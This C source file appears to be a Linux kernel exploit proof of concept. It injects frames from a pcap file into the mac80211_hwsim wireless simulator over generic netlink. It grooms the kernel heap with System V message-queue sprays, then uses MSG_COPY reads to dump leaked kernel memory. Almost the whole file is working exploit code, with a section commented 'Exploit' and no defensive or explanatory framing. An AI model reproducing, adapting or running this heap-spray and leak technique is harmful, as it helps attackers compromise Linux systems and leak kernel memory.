/*
 * cc -o inject-pcap inject-pcap.c $(pkg-config --cflags --libs  libnl-3.0 libnl-genl-3.0 libpcap)
 */

#include <netlink/netlink.h>
#include <netlink/genl/genl.h>
#include <netlink/genl/ctrl.h>
#include <net/if.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <pcap/pcap.h>

#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <unistd.h>
#include <fcntl.h>

#define HWSIM_CMD_REGISTER 1
#define HWSIM_CMD_FRAME 2

#define HWSIM_ATTR_ADDR_RECEIVER 1
#define HWSIM_ATTR_FRAME 3
#define HWSIM_ATTR_RX_RATE 5
#define HWSIM_ATTR_SIGNAL 6

#define CHECK(call) do { if (call) { fprintf(stderr, "pcap failure: %s\n", errbuf); return 2; } } while (0)
#define HEADER_SZ 48
#define MSIZE 128-HEADER_SZ

#define SPRAY_1024 100
#define SPRAY_512 1500

#define HOLE_STEP 4
#define MAX_QUEUES 8

#define MSG_COPY 040000

static int family;
int msqids[MAX_QUEUES];

struct {
    long mtype;
    char mtext[MSIZE];
} msg;

void alloc_many(int n) {
	int val = 0x49;
    msg.mtype = 1;
    printf("[*] Allocating %d msg_msg(s)\n", n);
    for(int i = 0; i < n; i++) {
		if (i == 7) {
			msg.mtype = 7;
		}
 	    memset(msg.mtext, val, MSIZE-2);
		msg.mtext[MSIZE-1] = 0;
        msqids[i] = msgget(IPC_PRIVATE, 0666  | IPC_CREAT);
		msg.mtext[MSIZE-2] = i; 
        if (msgsnd(msqids[i], &msg, sizeof(msg.mtext), 0) != 0)
            printf("[*] Error w. msgsnd() #%d in alloc_many\n", msqids[i]);
		val += 0x10;
    }
}

int make_queue(int type) {
	msg.mtype = type;
	int id = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	if (id == -1) {
		return -1;
	}
	return id;
}

void send_msg(int qid, int size, int c, int type) {
    struct msgbuf {
        long mtype;
        char mtext[size - 0x30];
    } msg;

    msg.mtype = type;

    memset(msg.mtext, c, sizeof(msg.mtext));

    if (msgsnd(qid, &msg, sizeof(msg.mtext), 0) == -1) {
        perror("msgsnd");
        exit(1);
    }
}

void *recv_msg(int qid, size_t size) {
    void *memdump = malloc(size);
    if (msgrcv(qid, memdump, size, 1, IPC_NOWAIT | MSG_NOERROR) == -1) {
        perror("msgrcv");
        return NULL;
    }
    return memdump;
}

void *recv_msg_cpy(int qid, size_t size, int type) {
    void *memdump = malloc(size);
	int r = msgrcv(qid, memdump, size, type, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
    if ( r == -1) {
        perror("msgrcv");
        return NULL;
    }
	printf("[BYTES COPIED]: %d\n", r);
    return memdump;
}

void free_many(int n) {
    printf("[*] Freeing %d msg_msg(s)\n", n);
    for (int i = 0; i < n; i++) {
		char buf[sizeof(msg.mtext)];
		int r = msgrcv(msqids[i], &buf, sizeof(msg.mtext), 7, MSG_NOERROR |MSG_COPY | IPC_NOWAIT);
        if (r == -1) {
            printf("[*] Error w. msgrcv() #%d in free_many\n", i);
		} else {
			printf("[*] Received: %d\n", r);
			for (int i = 0; i < sizeof(msg.mtext); i++)
			{
				printf("%02x", buf[i]);
			}
		}
    }
}

void heap_groom(int n) {
    memset(msg.mtext, 0x69, MSIZE-1);
    msg.mtext[MSIZE-1] = 0;
    msg.mtype = 1;
    int msqids[n];
    size_t i = 0; 
    printf("[*] Allocating %d msg_msg(s)\n", n);
    for(; i < n; i++) {
        msqids[i] = msgget(IPC_PRIVATE, 0644  | IPC_CREAT);
        if (msgsnd(msqids[i], &msg, sizeof(msg.mtext), 0) != 0)
            printf("[*] Error w. msgsnd() #%d in heap groom\n", msqids[i]);
    }
    printf("[*] Freeing %d msg_msg(s)\n", n);
    for (i = 0; i < n; i++) {
        if (msgrcv(msqids[i], &msg.mtext, sizeof(msg.mtext),1, IPC_NOWAIT | MSG_NOERROR) == -1)
            printf("[*] Error w. msgrcv() #%d in heap groom\n", msqids[i]);
    }
}

static void handle_pkt_free(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
{
	struct nl_msg *msg = nlmsg_alloc_simple(10, 0);
	struct nl_sock *sk = (void *)user;
	int err;
	genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, family,
			0, 0, HWSIM_CMD_FRAME, 1);
	nla_put(msg, HWSIM_ATTR_ADDR_RECEIVER, 6, "\x42\x00\x00\x00\x00\x00"); 
	nla_put_u32(msg, HWSIM_ATTR_RX_RATE, 0);
	nla_put_u32(msg, HWSIM_ATTR_SIGNAL, -60);
	// printf("h->caplen: %d\n", h->caplen);
	nla_put(msg, HWSIM_ATTR_FRAME, h->caplen, bytes);
	err = nl_send_auto(sk, msg);
	if (err < 0)
		printf("Can't send msg1: %s\n", nl_geterror(err));
	nlmsg_free(msg);
}

int main(int argc, char **argv)
{
	/*
		Setup
	*/
	char errbuf[PCAP_ERRBUF_SIZE];
	int sockfd;
	struct ifreq ifr;
	int err, idx;

	if (argc < 2) {
		fprintf(stderr, "usage: %s <pcap files>\n", argv[0]);
		return 2;
	}

	CHECK(pcap_init(1, errbuf));

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd < 0) {
		printf("Can't open socket to reset adapters");
		exit(1);
	}

	struct nl_sock *sk = nl_socket_alloc();
	if (!sk) {
		printf("Failed to allocate socket");
		exit(1);
	}
	if (genl_connect(sk) < 0) {
		printf("Failed to connect socket");
		exit(1);
	}

	family = genl_ctrl_resolve(sk, "MAC80211_HWSIM");

	err = genl_send_simple(sk, family, HWSIM_CMD_REGISTER, 1, 0);
	if (err < 0) {
		printf("Error while registering: %s\n", nl_geterror(err));
		exit(1);
	}

	memset(&ifr, 0, sizeof ifr);
	strncpy(ifr.ifr_name, "wlan0", IFNAMSIZ);
	ifr.ifr_flags |= IFF_UP;
	ioctl(sockfd, SIOCSIFFLAGS, &ifr);

	memset(&ifr, 0, sizeof ifr);
	strncpy(ifr.ifr_name, "hwsim0", IFNAMSIZ);
	ifr.ifr_flags |= IFF_UP;
	ioctl(sockfd, SIOCSIFFLAGS, &ifr);

	/*
		Exploit
	*/
	if ((msqids[0] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1) {
		perror("msgget");
		exit(1);
	}
	if ((msqids[1] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1) {
		perror("msgget");
		exit(1);
	}
	send_msg(msqids[0], 0x80, 0x30, 1);
	send_msg(msqids[1], 0x80, 0x31, 1);
	send_msg(msqids[1], 0x1000, 0x32, 1);

	for (int idx = 0; idx < 1; idx++) {
		pcap_t *input;
		input = pcap_open_offline(argv[1], errbuf);
		CHECK(!input);
		pcap_loop(input, -1, handle_pkt_free, (void *)sk);
	}
	sleep(1);
	for (int i = 0; i < 2; i++) {
		char *leak = recv_msg_cpy(msqids[i], 0x10ff, 1);
		printf("[LEAK: %d] ==== \n", i);
		if (leak != NULL) {
			for (int i = 0; i < 0x10ff; i++)
			{
				printf("%02x", leak[i]);
				if (i % 16 == 0) {
					printf("\n");
				}
			}
			memset(leak, 0x0, 0x10ff);
			free(leak);
			leak = NULL; 
		}

	}

}
